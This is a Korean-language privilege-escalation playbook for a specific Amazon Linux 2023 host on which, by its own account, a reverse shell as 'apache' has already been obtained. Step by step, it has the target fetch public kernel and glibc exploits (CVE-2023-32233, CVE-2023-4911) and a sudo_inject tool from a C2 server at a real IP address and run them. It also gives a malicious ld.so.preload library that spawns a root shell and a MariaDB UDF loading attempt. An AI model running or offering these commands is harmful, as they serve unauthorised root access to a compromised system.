# Kernel Exploit Guide - Amazon Linux 2023

## 현재 상황
- **OS:** Amazon Linux 2023
- **Kernel:** 6.1.155-103.121.amzn2023.x86_64
- **Architecture:** x86_64
- **사용자:** apache
- **Ptrace 보호:** 비활성화 (0)

---

## 우선순위 공격 벡터

### 1. Ptrace 기반 Sudo Token 재사용 (최우선)
**필요 조건:**
- `ptrace_scope = 0` ✅ (확인됨)
- 다른 사용자가 sudo를 최근에 실행했을 것
- `/proc` 접근 가능

**공격 방법:**
```bash
# 1. sudo를 실행한 프로세스 찾기
ps aux | grep sudo
ps aux | grep -E "root.*bash|root.*sh"

# 2. 최근 sudo 사용 흔적 확인
ls -la /var/lib/sudo/ts/

# 3. Exploit 다운로드 (CVE-2021-3156 sudo baron samedit는 1.9.5p1 이하)
# 하지만 ptrace를 이용한 sudo token hijacking은 별도

# 4. 수동으로 확인
for pid in /proc/*/status; do
    grep -H "^Uid:" $pid 2>/dev/null | grep -v "1000.*1000.*1000"
done
```

**Exploit 도구:**
- `sudo_inject` - sudo 토큰 주입 도구
- 수동으로 ptrace를 사용하여 sudo 프로세스에 attach

---

### 2. Kernel 6.1.x 취약점

#### CVE-2023-32233 (Netfilter nf_tables)
**영향:** Linux Kernel 6.3.1 이하
**설명:** Netfilter nf_tables의 Use-After-Free 취약점

**확인:**
```bash
# nftables 사용 여부 확인
which nft
nft list tables

# Netfilter 모듈 확인
lsmod | grep nf
```

**Exploit:**
```bash
# 다운로드 (C2 서버에서)
wget https://github.com/Liuk3r/CVE-2023-32233/raw/main/exploit.c
gcc -o exploit exploit.c -static
chmod +x exploit

# 타겟에 전송
python3 -m http.server 5000

# 타겟에서
cd /tmp
wget http://13.158.67.78:5000/exploit
chmod +x exploit
./exploit
```

---

#### CVE-2022-2586 (nft_object UAF)
**영향:** Linux Kernel 5.19 이하
**설명:** nf_tables의 Use-After-Free

**확인:**
```bash
uname -r  # 6.1.155 - 패치 되었을 수 있음
cat /proc/version
```

**Exploit:**
```bash
# GitHub에서 다운로드
git clone https://github.com/Markakd/CVE-2022-2586.git
cd CVE-2022-2586
gcc -o exp exp.c -static
```

---

#### CVE-2023-4911 (Looney Tunables)
**영향:** glibc 2.35, 2.36, 2.37, 2.38
**설명:** glibc ld.so의 버퍼 오버플로우

**확인:**
```bash
# glibc 버전 확인
ldd --version

# 취약 여부 테스트
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "A=a" /bin/echo
```

**Exploit:**
```bash
# 다운로드
wget https://github.com/leesh3288/CVE-2023-4911/raw/main/gen_libc.py
wget https://github.com/leesh3288/CVE-2023-4911/raw/main/exp.py

python3 exp.py
./exploit
```

---

### 3. Dirty Pipe (CVE-2022-0847)
**영향:** Linux Kernel 5.8 - 5.17 (6.1.155는 패치됨)
**가능성:** 낮음 (커널 버전이 높음)

---

### 4. OverlayFS (CVE-2021-3493)
**영향:** Ubuntu Kernel (Amazon Linux는 해당 없음)
**가능성:** 낮음

---

## 실전 체크리스트

### 단계 1: 시스템 정보 재확인
```bash
# 커널 정보
uname -a
cat /proc/version

# glibc 버전
ldd --version

# CPU 아키텍처
cat /proc/cpuinfo | grep -i "model name"

# 보안 기능 확인
cat /proc/sys/kernel/dmesg_restrict
cat /proc/sys/kernel/kptr_restrict
cat /proc/sys/kernel/perf_event_paranoid
```

### 단계 2: 이용 가능한 도구 확인
```bash
# 컴파일러 있나?
which gcc
which cc
which make

# Python
which python3

# Perl
which perl

# 네트워크
which wget
which curl
which nc
```

### 단계 3: Netfilter/nftables 확인
```bash
# nftables 설치 여부
which nft
rpm -qa | grep nftables

# iptables/netfilter 모듈
lsmod | grep nf_tables
lsmod | grep netfilter
```

---

## CVE-2023-32233 상세 가이드 (가장 유망)

### 필요 조건
- Kernel 6.3.1 이하 ✅
- nf_tables 모듈 로드됨 (확인 필요)
- unprivileged user_namespaces 활성화 (보통 활성화됨)

### 단계별 실행

#### C2 서버에서:
```bash
# Exploit 다운로드 및 컴파일
cd /tmp
wget https://github.com/Liuk3r/CVE-2023-32233/raw/main/exploit.c
gcc -o cve_2023_32233 exploit.c -static -lpthread

# HTTP 서버 시작
python3 -m http.server 5000
```

#### 타겟 (리버스 쉘)에서:
```bash
# 다운로드
cd /tmp
wget http://13.158.67.78:5000/cve_2023_32233 2>/dev/null || curl -O http://13.158.67.78:5000/cve_2023_32233

# 실행
chmod +x cve_2023_32233
./cve_2023_32233

# 성공하면 root 쉘 획득
whoami  # root
```

---

## CVE-2023-4911 (Looney Tunables) 상세 가이드

### 필요 조건
- glibc 2.35-2.38
- SUID 바이너리 존재 (sudo, su 등)

### 단계별 실행

#### 1. glibc 버전 확인
```bash
ldd --version
# glibc 2.34 이상이면 가능성 있음
```

#### 2. 취약 여부 테스트
```bash
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=B" /usr/bin/su --help
```

에러 없이 실행되면 취약함

#### 3. Exploit 다운로드 (C2 서버)
```bash
git clone https://github.com/leesh3288/CVE-2023-4911.git
cd CVE-2023-4911

# 타겟의 glibc 버전에 맞게 조정
python3 gen_libc.py

# HTTP 서버
python3 -m http.server 5000
```

#### 4. 타겟에서 실행
```bash
cd /tmp
wget http://13.158.67.78:5000/exploit.py
wget http://13.158.67.78:5000/gen_libc.py

python3 gen_libc.py
python3 exploit.py

# 또는 C 버전
wget http://13.158.67.78:5000/exploit
chmod +x exploit
./exploit
```

---

## Ptrace 기반 공격 (Sudo Token Hijacking)

### 이론
- ptrace_scope가 0이면 모든 프로세스에 attach 가능
- sudo는 5분간 토큰 캐시
- 다른 사용자의 sudo 프로세스에 attach하여 토큰 재사용

### 수동 방법
```bash
# 1. sudo 프로세스 찾기
ps aux | grep sudo

# 2. sudo timestamp 확인
ls -la /var/lib/sudo/ts/
ls -la /var/run/sudo/ts/

# 3. 최근 sudo 사용자 확인
find /var/lib/sudo/ts -type f -mmin -5 2>/dev/null
```

### Exploit 도구 - sudo_inject
```bash
# C2 서버에서
git clone https://github.com/nongiach/sudo_inject.git
cd sudo_inject
make

# 타겟에 전송
python3 -m http.server 5000

# 타겟에서
cd /tmp
wget http://13.158.67.78:5000/exploit
chmod +x exploit
./exploit
```

---

## 대안: MariaDB UDF (재확인)

### MySQL FILE 권한 우회
```sql
-- 1. 플러그인 디렉토리 확인
SHOW VARIABLES LIKE 'plugin_dir';

-- 2. secure_file_priv 확인
SHOW VARIABLES LIKE 'secure_file_priv';

-- 3. 일반 테이블 사용
USE vulnerable_sns;
CREATE TABLE IF NOT EXISTS udf_data (content LONGBLOB);

-- 4. 로컬에서 .so 파일을 base64로 인코딩
-- base64 raptor_udf2.so > udf.b64

-- 5. SQL로 삽입
INSERT INTO udf_data VALUES (FROM_BASE64('base64데이터...'));

-- 6. 플러그인 로드 (FILE 권한 필요)
```

**문제:** FILE 권한이 없어서 막힘

---

## 대안: Writable /etc 파일

### /etc/ld.so.preload
```bash
# 쓰기 가능한지 확인
ls -la /etc/ld.so.preload

# 가능하면
echo "/tmp/evil.so" > /etc/ld.so.preload

# evil.so 생성
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# SUID 바이너리 실행
/usr/bin/sudo
```

---

## 우선순위 실행 순서

1. **CVE-2023-32233 (Netfilter)** - Kernel 6.1.155에 효과적일 가능성
2. **CVE-2023-4911 (Looney Tunables)** - glibc 버전 확인 후
3. **Ptrace sudo token hijacking** - 다른 사용자 활동 있을 때
4. **Writable /etc files** - find /etc -writable 재확인
5. **Cron jobs manipulation** - 정기적으로 실행되는 스크립트 찾기

---

## 다음 명령어 (타겟에서 실행)

```bash
# 1. nf_tables 모듈 확인
lsmod | grep nf_tables

# 2. glibc 버전 확인
ldd --version

# 3. user namespaces 확인
cat /proc/sys/kernel/unprivileged_userns_clone

# 4. 컴파일러 확인
which gcc || which cc

# 5. 모든 정보 출력
echo "=== Kernel Info ==="
uname -a
echo "=== glibc ==="
ldd --version
echo "=== nf_tables ==="
lsmod | grep nf
echo "=== Compiler ==="
which gcc
echo "=== Writable /etc ==="
find /etc -writable -type f 2>/dev/null | head -10
```

---

**작성일:** 2025-11-07
**타겟:** Amazon Linux 2023, Kernel 6.1.155
**상태:** Reverse Shell 획득, Privilege Escalation 시도 중
